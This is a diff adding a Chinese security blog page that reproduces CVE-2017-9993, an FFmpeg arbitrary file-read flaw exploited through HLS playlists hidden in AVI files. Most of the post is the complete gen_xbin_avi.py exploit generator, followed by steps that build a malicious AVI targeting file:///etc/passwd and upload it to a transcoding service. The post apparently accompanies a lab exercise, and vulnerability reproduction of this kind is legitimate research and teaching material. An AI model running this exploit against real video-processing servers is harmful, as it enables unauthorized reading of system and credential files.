@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="tea9">
+
+
+    <meta name="subtitle" content="加油">
+
+
+    <meta name="description" content="心中有光の孩子">
+
+
+    <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶姐姐,茶姐姐博客,茶茶茶博客,茶茶blog">
+
+
+<title>CVE-2017-9993-FFmpeg文件读取漏洞 | tea9のblog</title>
+
+
+
+    <link rel="icon" href="/image/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Tea9&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Tea9&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CVE-2017-9993-FFmpeg文件读取漏洞</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">tea9</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十月 31, 2020&nbsp;&nbsp;15:58:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
+                            
+                                <a href="/categories/%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+                            
+                                <a href="/categories/%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/">CVE</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="CVE-2017-9993-FFmpeg文件读取漏洞"><a href="#CVE-2017-9993-FFmpeg文件读取漏洞" class="headerlink" title="CVE-2017-9993-FFmpeg文件读取漏洞"></a>CVE-2017-9993-FFmpeg文件读取漏洞</h1><p><a target="_blank" rel="noopener" href="https://www.ichunqiu.com/course/59107">CVE-2017-9993-FFmpeg文件读取漏洞实验环境</a>  </p>
+<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>FFmpeg</p>
+<p>FFmpeg是一套目前非常流行的可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。它提供了录制、转换以及流化音视频的完整解决方案。目前有非常多的视音频软件或是视频网站、手机 APP 都采用了这个库。</p>
+<p>HLS 协议简单介绍</p>
+<p>HLS(HTTP Live Streaming)是苹果公司针对iPhone、iPod、iTouch和iPad等移动设备而开发的基于HTTP协议的流媒体解决方案。在 HLS 技术中 Web服务器向客户端提供接近实时的音视频流。但在使用的过程中是使用的标准的 HTTP 协议，所以这时，只要使用 HLS 的技术，就能在普通的 HTTP 的应用上直接提供点播和直播。</p>
+<p>该技术基本原理是将视频文件或视频流切分成小片(ts)并建立索引文件(m3u8)。客户端会先向服务器请求 m3u8索引文件，然后根据索引文件里面的url去请求真正的ts视频文件。如果是多级的m3u8索引的话，那就会从根索引文件开始，一层一层的往下去请求子的索引文件，获取最终的TS流文件的http请求地址与时间段。</p>
+<p>漏洞介绍</p>
+<p>6月24日，HackerOne平台名为neex的白帽子针对俄罗斯最大社交网站VK.com上报了该漏洞，并因此获得1000美元奖金。</p>
+<p>ffmpeg可处理HLS播放列表，而播放列表中已知可包含外部文件的援引。neex表示他借由该特性，利用avi文件中的GAB2字幕块，可以通过XBIN codec获取到视频转换网站的本地文件。</p>
+<p>影响范围</p>
+<p>3.2.2 3.2.5 3.1.2 2.6.8</p>
+<p>不受影响的版本</p>
+<p>3.3.2</p>
+<p>漏洞危害</p>
+<p>该漏洞可导致读取本地任意文件，危害较大,Google,Yahoo,Youtube等门户、视听网站以及支持流转码服务的业务已被曝出存在该漏洞。国内支持流转码的网站也可能有存在该漏洞的风险。</p>
+<h2 id="漏洞利用脚本"><a href="#漏洞利用脚本" class="headerlink" title="漏洞利用脚本"></a>漏洞利用脚本</h2><p>gen_xbin_avi.py<br><a target="_blank" rel="noopener" href="https://github.com/neex/ffmpeg-avi-m3u-xbin">gen_xbin_avi.py</a>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import struct</span><br><span class="line">import argparse</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">AVI_HEADER = b&quot;RIFF\x00\x00\x00\x00AVI LIST\x14\x01\x00\x00hdrlavih8\x00\x00\x00@\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00&#125;\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LISTt\x00\x00\x00strlstrh8\x00\x00\x00txts\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00&#125;\x00\x00\x00\x86\x03\x00\x00\x10&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\xa0\x00strf(\x00\x00\x00(\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x01\x00\x18\x00XVID\x00H\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LIST    movi&quot;</span><br><span class="line"></span><br><span class="line">ECHO_TEMPLATE = &quot;&quot;&quot;### echoing &#123;needed!r&#125;</span><br><span class="line">#EXT-X-KEY: METHOD=AES-128, URI=/dev/zero, IV=0x&#123;iv&#125;</span><br><span class="line">#EXTINF:1,</span><br><span class="line">#EXT-X-BYTERANGE: 16</span><br><span class="line">/dev/zero</span><br><span class="line">#EXT-X-KEY: METHOD=NONE</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># AES.new(&#x27;\x00&#x27;*16).decrypt(&#x27;\x00&#x27;*16)</span><br><span class="line">GAMMA = b&#x27;\x14\x0f\x0f\x10\x11\xb5&quot;=yXw\x17\xff\xd9\xec:&#x27;</span><br><span class="line"></span><br><span class="line">FULL_PLAYLIST = &quot;&quot;&quot;#EXTM3U</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">&#123;content&#125;</span><br><span class="line">#### random string to prevent caching: &#123;rand&#125;</span><br><span class="line">#EXT-X-ENDLIST&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">EXTERNAL_REFERENCE_PLAYLIST = &quot;&quot;&quot;</span><br><span class="line">####  External reference: reading &#123;size&#125; bytes from &#123;filename&#125; (offset &#123;offset&#125;)</span><br><span class="line">#EXTINF:1,</span><br><span class="line">#EXT-X-BYTERANGE: &#123;size&#125;@&#123;offset&#125;</span><br><span class="line">&#123;filename&#125;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">XBIN_HEADER = b&#x27;XBIN\x1A\x20\x00\x0f\x00\x10\x04\x01\x00\x00\x00\x00&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def echo_block(block):</span><br><span class="line">    assert len(block) == 16</span><br><span class="line">    iv = &#x27;&#x27;.join(map(&#x27;&#123;:02x&#125;&#x27;.format, [x ^ y for (x, y) in zip(block, GAMMA)]))</span><br><span class="line">    return ECHO_TEMPLATE.format(needed=block, iv=iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gen_xbin_sync():</span><br><span class="line">    seq = []</span><br><span class="line">    for i in range(60):</span><br><span class="line">        if i % 2:</span><br><span class="line">            seq.append(0)</span><br><span class="line">        else:</span><br><span class="line">            seq.append(128 + 64 - i - 1)</span><br><span class="line">    for i in range(4, 0, -1):</span><br><span class="line">        seq.append(128 + i - 1)</span><br><span class="line">    seq.append(0)</span><br><span class="line">    seq.append(0)</span><br><span class="line">    for i in range(12, 0, -1):</span><br><span class="line">        seq.append(128 + i - 1)</span><br><span class="line">    seq.append(0)</span><br><span class="line">    seq.append(0)</span><br><span class="line">    return seq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def test_xbin_sync(seq):</span><br><span class="line">    for start_ind in range(64):</span><br><span class="line">        path = [start_ind]</span><br><span class="line">        cur_ind = start_ind</span><br><span class="line">        while cur_ind &lt; len(seq):</span><br><span class="line">            if seq[cur_ind] == 0:</span><br><span class="line">                cur_ind += 3</span><br><span class="line">            else:</span><br><span class="line">                assert seq[cur_ind] &amp; (64 + 128) == 128</span><br><span class="line">                cur_ind += (seq[cur_ind] &amp; 63) + 3</span><br><span class="line">            path.append(cur_ind)</span><br><span class="line">        assert cur_ind == len(seq), &quot;problem for path &#123;&#125;&quot;.format(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def echo_seq(s):</span><br><span class="line">    assert len(s) % 16 == 0</span><br><span class="line">    res = []</span><br><span class="line">    for i in range(0, len(s), 16):</span><br><span class="line">        res.append(echo_block(s[i:i + 16]))</span><br><span class="line">    return &#x27;&#x27;.join(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test_xbin_sync(gen_xbin_sync())</span><br><span class="line"></span><br><span class="line">SYNC = echo_seq(gen_xbin_sync())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def make_playlist_avi(playlist, fake_packets=1000, fake_packet_len=3):</span><br><span class="line">    content = b&#x27;GAB2\x00\x02\x00&#x27; + b&#x27;\x00&#x27; * 10 + playlist.encode(&#x27;ascii&#x27;)</span><br><span class="line">    packet = b&#x27;00tx&#x27; + struct.pack(&#x27;&lt;I&#x27;, len(content)) + content</span><br><span class="line">    dcpkt = b&#x27;00dc&#x27; + struct.pack(&#x27;&lt;I&#x27;,</span><br><span class="line">                                  fake_packet_len) + b&#x27;\x00&#x27; * fake_packet_len</span><br><span class="line">    return AVI_HEADER + packet + dcpkt * fake_packets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gen_xbin_packet_header(size):</span><br><span class="line">    return bytes([0] * 9 + [1] + [0] * 4 + [128 + size - 1, 10])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gen_xbin_packet_playlist(filename, offset, packet_size):</span><br><span class="line">    result = []</span><br><span class="line">    while packet_size &gt; 0:</span><br><span class="line">        packet_size -= 16</span><br><span class="line">        assert packet_size &gt; 0</span><br><span class="line">        part_size = min(packet_size, 64)</span><br><span class="line">        packet_size -= part_size</span><br><span class="line">        result.append(echo_block(gen_xbin_packet_header(part_size)))</span><br><span class="line">        result.append(</span><br><span class="line">            EXTERNAL_REFERENCE_PLAYLIST.format(</span><br><span class="line">                size=part_size,</span><br><span class="line">                offset=offset,</span><br><span class="line">                filename=filename))</span><br><span class="line">        offset += part_size</span><br><span class="line">    return &#x27;&#x27;.join(result), offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gen_xbin_playlist(filename_to_read):</span><br><span class="line">    pls = [echo_block(XBIN_HEADER)]</span><br><span class="line">    next_delta = 5</span><br><span class="line">    for max_offs, filename in (</span><br><span class="line">            (5000, filename_to_read), (500, &quot;file:///dev/zero&quot;)):</span><br><span class="line">        offset = 0</span><br><span class="line">        while offset &lt; max_offs:</span><br><span class="line">            for _ in range(10):</span><br><span class="line">                pls_part, new_offset = gen_xbin_packet_playlist(</span><br><span class="line">                    filename, offset, 0xf0 - next_delta)</span><br><span class="line">                pls.append(pls_part)</span><br><span class="line">                next_delta = 0</span><br><span class="line">            offset = new_offset</span><br><span class="line">        pls.append(SYNC)</span><br><span class="line">    return FULL_PLAYLIST.format(content=&#x27;&#x27;.join(pls), rand=&#x27;&#x27;.join(</span><br><span class="line">        random.choice(string.ascii_lowercase) for i in range(30)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    parser = argparse.ArgumentParser(&#x27;AVI+M3U+XBIN ffmpeg exploit generator&#x27;)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        &#x27;filename&#x27;,</span><br><span class="line">        help=&#x27;filename to be read from the server (prefix it with &quot;file://&quot;)&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;output_avi&#x27;, help=&#x27;where to save the avi&#x27;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    assert &#x27;://&#x27; in args.filename, &quot;ffmpeg needs explicit proto (forgot file://?)&quot;</span><br><span class="line">    content = gen_xbin_playlist(args.filename)</span><br><span class="line">    avi = make_playlist_avi(content)</span><br><span class="line">    output_name = args.output_avi</span><br><span class="line"></span><br><span class="line">    with open(output_name, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(avi)</span><br></pre></td></tr></table></figure>
+
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p><code>./gen_xbin_avi.py file://&lt;filename&gt; file_read.avi</code>  </p>
+<p>运行脚本  </p>
+<p><code>python gen_xbin_avi.py file:///etc/passwd passwd.avi</code></p>
+<p>上传视频文件 查看<br><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/37/01.png"></p>
+<p><a target="_blank" rel="noopener" href="https://www.ichunqiu.com/experiment/detail?id=59111&source=1">FFmpeg文件读取漏洞（CVE-2017-9993）</a>  </p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>tea9</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://tea9.xyz/post/1787481902.html">http://tea9.xyz/post/1787481902.html</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CVE/"># CVE</a>
+                    
+                        <a href="/tags/FFmpeg/"># FFmpeg</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/post/525637870.html">android-drozer</a>
+            
+            
+            <a class="next" rel="next" href="/post/3420824369.html">50 本各学科领域入门书</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© tea9 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
